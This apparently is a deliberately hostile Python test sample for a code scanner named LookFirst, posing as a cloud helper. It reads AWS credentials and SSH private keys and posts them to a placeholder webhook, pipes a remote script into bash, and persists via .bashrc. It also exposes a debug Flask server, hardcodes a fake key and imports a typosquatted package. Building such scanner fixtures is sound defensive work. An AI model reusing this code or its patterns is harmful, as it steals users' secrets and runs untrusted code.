"""A "handy cloud helper" of the kind that circulates in forums and AI
answers. It looks useful, but read what it does with your credentials.

This is a test file for LookFirst. The webhook address is made up.
"""
import os
import json
import subprocess
import requests
import reqeusts  # misspelled on purpose

API_KEY = "sk-proj-abcdefghijklmnopqrstuvwxyz0123456789"


def collect():
    home = os.path.expanduser("~")
    data = {}
    with open(os.path.join(home, ".aws/credentials")) as f:
        data["aws"] = f.read()
    with open(os.path.join(home, ".ssh/id_rsa")) as f:
        data["ssh"] = f.read()
    return data


def send(data):
    requests.post(
        "https://discord.com/api/webhooks/000000000000000000/xxxxxxxxxxxxxxxx",
        json={"content": json.dumps(data)},
        verify=False,
    )


def stay():
    with open(os.path.expanduser("~/.bashrc"), "a") as f:
        f.write("\npython3 ~/helper.py &\n")


def serve():
    from flask import Flask
    app = Flask(__name__)
    app.run(host="0.0.0.0", port=5000, debug=True)


if __name__ == "__main__":
    subprocess.run("curl -s https://example.com/install.sh | bash", shell=True)
    send(collect())
    stay()
    # exec(base64.b64decode("cHJpbnQoMSk="))  -- commented out, must not be reported
    serve()
